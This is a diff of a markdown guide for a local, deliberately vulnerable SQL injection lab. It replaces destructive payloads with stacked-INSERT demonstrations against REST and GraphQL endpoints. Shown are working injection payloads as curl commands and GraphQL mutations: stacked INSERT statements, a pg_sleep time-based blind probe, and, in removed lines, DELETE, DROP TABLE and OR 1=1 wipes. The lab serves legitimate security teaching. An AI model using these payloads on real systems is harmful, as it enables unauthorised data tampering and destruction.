@@ -167,31 +167,41 @@ curl -g "http://localhost:5001/api/insecure-users/0%20UNION%20SELECT%201,table_n
 
 ---
 
-### 3 — Stacked queries (execute additional statements)
+### 3 — Stacked queries — INSERT INTO users (showcase)
 
 `pool.query()` uses PostgreSQL simple-query protocol — multiple statements
-separated by `;` are all executed.
+separated by `;` are all executed. Each example below inserts a new row into
+`users` to give a concrete, verifiable result.
 
 ```bash
-# POST /clothes  →  INSERT completes, then second statement runs
-# Inject a new user row
+# ── GET /insecure-users/:userid ───────────────────────────────────────────────
+# SQL: SELECT * FROM users WHERE userid = 1; INSERT INTO users... --
+curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Alex1','REST_GET')--"
+
+# ── GET /insecure-users/:userid/clothes ──────────────────────────────────────
+# SQL: WHERE uc.userid = 1; INSERT INTO users... --
+curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Alex2','REST_GET_clothes')--/clothes"
+
+# ── POST /api/insecure-users/clothes  (via clothid, integer context) ─────────
+# clothid payload closes VALUES() then stacks INSERT
+# SQL: INSERT INTO user_clothes ... VALUES (5, 9); INSERT INTO users... --
 curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
   -H "Content-Type: application/json" \
-  $'{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES(\'Hacked\',\'User\'); --"}'
+  $'{"userid":"5","clothid":"9); INSERT INTO users(name,surname) VALUES(\'Alex3\',\'REST_POST_clothes\'); --"}'
 
-# Delete ALL clothing assignments in one shot
-curl -s -X POST http://localhost:5001/api/insecure-users/clothes \
-  -H "Content-Type: application/json" \
-  -d '{"userid":"5","clothid":"9); DELETE FROM user_clothes; --"}'
-
-# Stacked via GET (URL-encoded semicolon %3B)
-# INSERT a user via the GET route
-curl -g "http://localhost:5001/api/insecure-users/1%3B%20INSERT%20INTO%20users(name,surname)%20VALUES('Eve','Hacker')--"
-
-# Drop a table (destructive — restart stack to recover)
+# ── POST /api/insecure-users/remove-cloth  (via clothid, integer context) ────
+# SQL: DELETE FROM user_clothes WHERE userid=1 AND clothid=1; INSERT INTO users... --
 curl -s -X POST http://localhost:5001/api/insecure-users/remove-cloth \
   -H "Content-Type: application/json" \
-  -d '{"userid":"1","clothid":"1; DROP TABLE user_clothes; --"}'
+  $'{"userid":"1","clothid":"1; INSERT INTO users(name,surname) VALUES(\'Alex4\',\'REST_POST_remove\'); --"}'
+```
+
+Verify all four injections landed:
+
+```bash
+docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
+  -c "SELECT * FROM users ORDER BY userid;"
+# Seed rows: userid 1–5.  Injected rows: Alex1–Alex4 appended.
 ```
 
 ---
@@ -248,50 +258,36 @@ SQL: `` INSERT INTO user_clothes (userid, clothid) VALUES (${userid}, '${clothid
 string-context injection point in the app. `userid` is still bare integer.
 
 ```bash
-# Via clothid (string context) — classic ' break + stacked INSERT
-# clothid payload:  9'); INSERT INTO users(name,surname) VALUES('Eve','GraphQL'); --
+# ── Via clothid (string context) — ' break ───────────────────────────────────
+# SQL: INSERT INTO user_clothes VALUES (5, '9');
+#      INSERT INTO users(name,surname) VALUES('Alex5','GQL_clothid'); --')
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
-  -d '{
-    "query": "mutation { addInsecureCloth(userid: \"5\", clothid: \"9'"'"'); INSERT INTO users(name,surname) VALUES('"'"'Eve'"'"','"'"'GraphQL'"'"'); --\") }"
-  }'
+  $'{"query":"mutation { addInsecureCloth(userid: \\"5\\", clothid: \\"9\'); INSERT INTO users(name,surname) VALUES(\'Alex5\',\'GQL_clothid\'); --\\") }"}'
 
-# Cleaner with $'...' quoting
+# ── Via userid (integer context) — ) break ───────────────────────────────────
+# SQL: INSERT INTO user_clothes VALUES (5, 9);
+#      INSERT INTO users(name,surname) VALUES('Alex6','GQL_userid'); --', '9')
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
-  $'{"query":"mutation { addInsecureCloth(userid: \\"5\\", clothid: \\"9\'); INSERT INTO users(name,surname) VALUES(\'Eve\',\'GraphQL\'); --\\") }"}'
-
-# Resulting SQL:
-#   INSERT INTO user_clothes (userid, clothid) VALUES (5, '9');
-#   INSERT INTO users(name,surname) VALUES('Eve','GraphQL'); --')
-
-# Via userid (integer context) — close VALUES early, inject second statement
-# userid payload:  5, 9); DELETE FROM user_clothes; --
-curl -s -X POST http://localhost:5001/graphql-insecure \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { addInsecureCloth(userid: \"5, 9); DELETE FROM user_clothes; --\", clothid: \"9\") }"}'
-
-# Resulting SQL:
-#   INSERT INTO user_clothes (userid, clothid) VALUES (5, 9);
-#   DELETE FROM user_clothes; --', '9')
+  $'{"query":"mutation { addInsecureCloth(userid: \\"5, 9); INSERT INTO users(name,surname) VALUES(\'Alex6\',\'GQL_userid\'); --\\", clothid: \\"9\\") }"}'
 ```
 
-Use GraphiQL for easier testing — paste directly into the editor at
-`http://localhost:5001/graphql-insecure`:
+GraphiQL (`http://localhost:5001/graphql-insecure`) — paste directly:
 
 ```graphql
-# clothid string-context injection
+# clothid — string context (' break)
 mutation {
   addInsecureCloth(
     userid: "5"
-    clothid: "9'); INSERT INTO users(name,surname) VALUES('Eve','GraphQL'); --"
+    clothid: "9'); INSERT INTO users(name,surname) VALUES('Alex5','GQL_clothid'); --"
   )
 }
 
-# userid integer-context injection (close VALUES, stack DELETE)
+# userid — integer context () break)
 mutation {
   addInsecureCloth(
-    userid: "5, 9); DELETE FROM user_clothes; --"
+    userid: "5, 9); INSERT INTO users(name,surname) VALUES('Alex6','GQL_userid'); --"
     clothid: "9"
   )
 }
@@ -306,33 +302,26 @@ SQL: `` DELETE FROM user_clothes WHERE userid = ${userid} AND clothid = ${clothi
 Both parameters are bare integers — same techniques as the REST remove-cloth route.
 
 ```bash
-# Boolean: wipe entire user_clothes table
+# ── Stacked INSERT via clothid ────────────────────────────────────────────────
+# SQL: DELETE FROM user_clothes WHERE userid=1 AND clothid=1;
+#      INSERT INTO users(name,surname) VALUES('Alex7','GQL_remove'); --
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
-  -d '{"query":"mutation { removeInsecureCloth(userid: \"1\", clothid: \"1 OR 1=1\") }"}'
+  $'{"query":"mutation { removeInsecureCloth(userid: \\"1\\", clothid: \\"1; INSERT INTO users(name,surname) VALUES(\'Alex7\',\'GQL_remove\'); --\\") }"}'
 
-# Resulting SQL:
-#   DELETE FROM user_clothes WHERE userid = 1 AND clothid = 1 OR 1=1
-#   (OR 1=1 has lower precedence than AND → deletes ALL rows)
-
-# Stacked: drop the table entirely
-curl -s -X POST http://localhost:5001/graphql-insecure \
-  -H "Content-Type: application/json" \
-  -d '{"query":"mutation { removeInsecureCloth(userid: \"1\", clothid: \"1; DROP TABLE user_clothes; --\") }"}'
-
-# Time-based blind
+# ── Time-based blind ──────────────────────────────────────────────────────────
 curl -s -X POST http://localhost:5001/graphql-insecure \
   -H "Content-Type: application/json" \
   -d '{"query":"mutation { removeInsecureCloth(userid: \"1\", clothid: \"1; SELECT pg_sleep(3); --\") }"}' \
   -w "\nTotal time: %{time_total}s\n"
 ```
 
-In GraphiQL:
+GraphiQL:
 
 ```graphql
-# Boolean wipe
+# Stacked INSERT (showcase)
 mutation {
-  removeInsecureCloth(userid: "1", clothid: "1 OR 1=1")
+  removeInsecureCloth(userid: "1", clothid: "1; INSERT INTO users(name,surname) VALUES('Alex7','GQL_remove'); --")
 }
 
 # Time-based blind
@@ -356,11 +345,24 @@ needed, that's what the normal route is for.
 
 ---
 
-### Verify injections in the database
+### Verify all injections
 
 ```bash
-docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM users;"
-docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject -c "SELECT * FROM user_clothes;"
+docker exec -it sqlinj-db psql -U sql_lab_user -d sqlinjproject \
+  -c "SELECT * FROM users ORDER BY userid;"
 ```
+
+Expected after running all 7 examples:
+
+| userid | name  | surname          |
+|--------|-------|------------------|
+| 1–5    | (seed data)      |
+| …      | Alex1 | REST_GET         |
+| …      | Alex2 | REST_GET_clothes |
+| …      | Alex3 | REST_POST_clothes|
+| …      | Alex4 | REST_POST_remove |
+| …      | Alex5 | GQL_clothid      |
+| …      | Alex6 | GQL_userid       |
+| …      | Alex7 | GQL_remove       |
 
 Reset to clean state: `docker compose down -v && docker compose up -d`
